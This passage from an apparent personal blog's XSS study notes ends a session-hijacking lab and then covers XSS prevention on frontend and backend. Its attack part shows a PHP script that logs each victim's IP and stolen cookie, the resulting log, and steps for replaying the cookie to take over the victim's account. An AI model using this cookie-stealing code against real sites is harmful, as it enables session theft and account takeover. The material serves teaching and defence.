+</span></span><span style="display:flex;"><span>        $cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($value);
+</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;cookies.txt&#34;</span>, <span style="color:#e6db74">&#34;a+&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fputs</span>($file, <span style="color:#e6db74">&#34;Victim IP: </span><span style="color:#e6db74">{</span>$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> | Cookie: </span><span style="color:#e6db74">{</span>$cookie<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for <code>script.js</code>, which in turn will make another request with the cookie value:</p>
+<pre tabindex="0"><code>10.10.10.10:52798 [200]: /script.js
+10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
+</code></pre><p>As mentioned earlier, we get the cookie value right in the terminal, as we can see. However, since we prepared a PHP script, we also get the <code>cookies.txt</code> file with a clean log of cookies:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat cookies.txt 
+</span></span><span style="display:flex;"><span>Victim IP: 10.10.10.1 | Cookie: cookie<span style="color:#f92672">=</span>f904f93c949d19d870911bf8b05fe7b2
+</span></span></code></pre></div><p>Finally, we can use this cookie on the <code>login.php</code> page to access the victim&rsquo;s account. To do so, once we navigate to <code>/hijacking/login.php</code>, we can click <code>Shift+F9</code> in Firefox to reveal the <code>Storage</code> bar in the <code>Developer Tools</code>. Then, we can click on the <code>+</code> button on the top right corner and add our cookie, where the <code>Name</code> is the part before <code>=</code> and the <code>Value</code> is the part after <code>=</code> from our stolen cookie. Once we set our cokoie, we can refresh the page and we will get access as the victim.</p>
+<p>　</p>
+<h2 id="xss-prevention">XSS Prevention</h2>
+<p>As discussed previously, XSS vulnerabilities are mainly linked to two parts of the web application: a <strong>SOURCE</strong> like a user input field and a <strong>SINK</strong> that displays the input data. These are the main two points that we should focus on securing, both in the frontend and in the backend.</p>
+<h3 id="frontend">Frontend</h3>
+<p>As the frontend of the web application is where most (but not all) of the user input is taken from, it is essential to sanitize and validate the user input on the frontend using JavaScript.</p>
+<h4 id="input-validation">Input Validation</h4>
+<p>For example, in the exercise of the XSS Discovery section, we saw that the web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validateEmail</span>(<span style="color:#a6e22e">email</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">re</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^(([^&lt;&gt;()[\]\\.,;:\s@\&#34;]+(\.[^&lt;&gt;()[\]\\.,;:\s@\&#34;]+)*)|(\&#34;.+\&#34;))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#login input[name=email]&#34;</span>).<span style="color:#a6e22e">val</span>());
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As we can see, this code is testing the <code>email</code> input field and returning <code>true</code> or <code>false</code> whether it matches the regex validation of an email format.</p>
+<h4 id="input-sanitization">Input Sanitization</h4>
+<p>In addition to input validation, we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can use the <code>DOMPurify</code> JavaScript library, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dist/purify.min.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">clean</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>( <span style="color:#a6e22e">dirty</span> );
+</span></span></code></pre></div><p>This will escape any special characters with a backslash <code>\</code>, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.</p>
+<h4 id="direct-input">Direct Input</h4>
+<p>Finally, we should always ensure that we never use user input directly within certain HTML tags, like:</p>
+<ol>
+<li>JavaScript code <code>&lt;script&gt;&lt;/script&gt;</code></li>
+<li>CSS Style Code <code>&lt;style&gt;&lt;/style&gt;</code></li>
+<li>Tag/Attribute Fields <code>&lt;div name='INPUT'&gt;&lt;/div&gt;</code></li>
+<li>HTML Comments <code>&lt;!-- --&gt;</code></li>
+</ol>
+<p>If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:</p>
+<ul>
+<li><code>DOM.innerHTML</code></li>
+<li><code>DOM.outerHTML</code></li>
+<li><code>document.write()</code></li>
+<li><code>document.writeln()</code></li>
+<li><code>document.domain</code></li>
+</ul>
+<p>And the following jQuery functions:</p>
+<ul>
+<li><code>html()</code></li>
+<li><code>parseHTML()</code></li>
+<li><code>add()</code></li>
+<li><code>append()</code></li>
+<li><code>prepend()</code></li>
+<li><code>after()</code></li>
+<li><code>insertAfter()</code></li>
+<li><code>before()</code></li>
+<li><code>insertBefore()</code></li>
+<li><code>replaceAll()</code></li>
+<li><code>replaceWith()</code></li>
+</ul>
+<p>As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.</p>
+<h3 id="backend">Backend</h3>
+<p>On the other end, we should also ensure that we prevent XSS vulnerabilities with measures on the backend to prevent Stored and Reflected XSS vulnerabilities. As we saw in the XSS Discovery section exercise, even though it had frontend input validation, this was not enough to prevent us from injecting a malicious payload into the form. So, we should have XSS prevention measures on the backend as well. This can be achieved with Input and Output Sanitization and Validation, Server Configuration, and Backend Tools that help prevent XSS vulnerabilities.</p>
+<h4 id="input-validation-1">Input Validation</h4>
+<p><strong>Input validation</strong> in the backend is quite similar to the frontend, and it uses Regex or library functions to ensure that the input field is what is expected. If it does not match, then the backend server will reject it and not display it.</p>
+<p>An example of e-mail validation on a PHP backend is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filter_var</span>($_GET[<span style="color:#e6db74">&#39;email&#39;</span>], <span style="color:#a6e22e">FILTER_VALIDATE_EMAIL</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// do task
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// reject input - do not display it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>For a NodeJS backend, we can use the same JavaScript code mentioned earlier from the frontend.</p>
+<h4 id="input-sanitization-1">Input Sanitization</h4>
+<p>When it comes to input sanitization, then the backend plays a vital role, as frontend input sanitization can be easily bypassed by sending custom <code>GET</code> or <code>POST</code> requests. Luckily, there are very strong libraries for various backend languages that can properly sanitize any user input, such that we ensure that no injection can occur.</p>
+<p>For example, for a PHP backend, we can use the <code>addslashes</code> function to sanitize user input by escaping special characters with a backslash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">addslashes</span>($_GET[<span style="color:#e6db74">&#39;email&#39;</span>])
+</span></span></code></pre></div><p>In any case, direct user input (e.g. <code>$_GET['email']</code>) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.</p>
+<p>For a NodeJS backend, we can also use the <code>DOMPurify</code> library as we did with the frontend, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">DOMPurify</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;dompurify&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clean</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">dirty</span>);
+</span></span></code></pre></div><h4 id="output-html-encoding">Output HTML Encoding</h4>
+<p>Another important aspect to pay attention to in the backend is <strong>Output Encoding</strong>. This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability. For a PHP backend, we can use the <code>htmlspecialchars</code> or the <code>htmlentities</code> functions, which would encode certain special characters into their HTML codes (e.g. <code>&lt;</code> into <code>&amp;lt</code>), so the browser will display them correctly, but they will not cause any injection of any sort:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">htmlentities</span>($_GET[<span style="color:#e6db74">&#39;email&#39;</span>])
+</span></span></code></pre></div><p>For a NodeJS backend, we can use any library that does HTML encoding, like <code>html-entities</code>, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">encode</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;html-entities&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">encode</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>); <span style="color:#75715e">// -&gt; &#39;&amp;lt;&#39;
+</span></span></span></code></pre></div><p>Once we ensure that all user input is validated, sanitized, and encoded on output, we should significantly reduce the risk of having XSS vulnerabilities.</p>
+<h4 id="server-configuration">Server Configuration</h4>
+<p>In addition to the above, there are certain backend web server configurations that may help in preventing XSS attacks, such as:</p>
+<ul>
+<li>Using HTTPS across the entire domain</li>
+<li>Using XSS prevention headers</li>
+<li>Using the appropriate <code>Content-Type</code> for the page, like <code>X-Content-Type-Options=nosniff</code>
+Using <code>Content-Security-Policy</code> options, like <code>script-src 'self'</code>, which only allows locally hosted scripts</li>
+<li>Using the <code>HttpOnly</code> and <code>Secure</code> cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS</li>
+</ul>
+<p>In addition to the above, having a good <strong>WAF (Web Application Firewall)</strong> can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like <code>ASP.NET</code>.</p>
+
+    </div>
+</div>
+
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#what-is-xss">What is XSS?</a></li>
+        <li><a href="#xss-attacks">XSS Attacks</a></li>
+        <li><a href="#types-of-xss">Types of XSS</a></li>
+      </ul>
+    </li>
+    <li><a href="#stored-xss">Stored XSS</a>
+      <ul>
+        <li><a href="#xss-testing-payloads">XSS Testing Payloads</a></li>
+      </ul>
+    </li>
+    <li><a href="#reflected-xss">Reflected XSS</a></li>
+    <li><a href="#dom-xss">DOM XSS</a>
+      <ul>
+        <li><a href="#source--sink">Source &amp; Sink</a></li>
+        <li><a href="#dom-attacks">DOM Attacks</a></li>
+      </ul>
+    </li>
+    <li><a href="#xss-discovery">XSS Discovery</a>
+      <ul>
+        <li><a href="#automated-discovery">Automated Discovery</a></li>
+        <li><a href="#manual-discovery">Manual Discovery</a></li>
+      </ul>
+    </li>
+    <li><a href="#defacing">Defacing</a>
+      <ul>
+        <li><a href="#defacement-elements">Defacement Elements</a></li>
+      </ul>
+    </li>
+    <li><a href="#phishing">Phishing</a>
+      <ul>
+        <li><a href="#xss-discovery-1">XSS Discovery</a></li>
+        <li><a href="#login-form-injection">Login Form Injection</a></li>
+        <li><a href="#cleaning-up">Cleaning Up</a></li>
+        <li><a href="#credential-stealing">Credential Stealing</a></li>
+      </ul>
+    </li>
+    <li><a href="#session-hijacking">Session Hijacking</a>
+      <ul>
+        <li><a href="#blind-xss-detection">Blind XSS Detection</a></li>
+        <li><a href="#loading-a-remote-script">Loading a Remote Script</a></li>
+        <li><a href="#session-hijacking-1">Session Hijacking</a></li>
+      </ul>
+    </li>
+    <li><a href="#xss-prevention">XSS Prevention</a>
+      <ul>
+        <li><a href="#frontend">Frontend</a></li>
+        <li><a href="#backend">Backend</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>&copy; 2024 Kauan Manzato</span>
+    
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
